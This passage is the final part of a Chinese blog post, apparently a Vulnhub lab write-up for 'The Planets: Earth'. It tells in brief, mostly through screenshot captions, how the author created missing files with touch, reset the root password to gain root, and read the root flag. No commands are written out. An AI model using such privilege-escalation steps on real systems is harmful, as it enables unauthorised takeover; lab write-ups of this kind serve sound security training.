<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-admin-login-strace-reset_root.jpg"
alt="The Planets Earth https earth-local-admin-login-strace-reset_root.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-admin-login-strace-reset_root.jpg</figcaption>
</figure>
<ul>
<li>提示没这三个文件，靶机中通过 touch 建立后再尝试</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-admin-login-reset_root-touch-file-su-root.jpg"
alt="The Planets Earth https earth-local-admin-login-reset_root-touch-file-su-root.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-admin-login-reset_root-touch-file-su-root.jpg</figcaption>
</figure>
<ul>
<li>root 密码重置及提权成功！查找 flag ，并读取。</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20flag.jpg"
alt="The Planets Earth flag.jpg" />
<figcaption aria-hidden="true">The Planets Earth flag.jpg</figcaption>
</figure>
<ul>
<li>成功拿到 <code>root_flag_b0da9554d29db2117b02aa8b66ec492e</code>
!</li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>Ghost
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://z9m8r8.github.io/2023/08/23/the-planets%EF%BC%9Aearth/" title="The Planets：Earth">https://z9m8r8.github.io/2023/08/23/the-planets：earth/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/Vulnhub-%E9%9D%B6%E5%9C%BA/" rel="tag"><i class="fa fa-tag"></i> Vulnhub 靶场</a>
              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/08/20/%E7%BB%95%E8%BF%87-cdn-%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9Eip/" rel="prev" title="绕过 CDN 获取真实IP">
                  <i class="fa fa-angle-left"></i> 绕过 CDN 获取真实IP
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/08/24/jangow-1-0-1/" rel="next" title="JANGOW: 1.0.1">
                  JANGOW: 1.0.1 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2020 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Ghost</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">205k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">12:27</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/fancybox.js"></script>

  <script src="/js/third-party/pace.js"></script>


  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2023/08/23/the-planets%EF%BC%9Aearth/"}</script>
  <script src="/js/third-party/quicklink.js"></script>

</body>
</html>
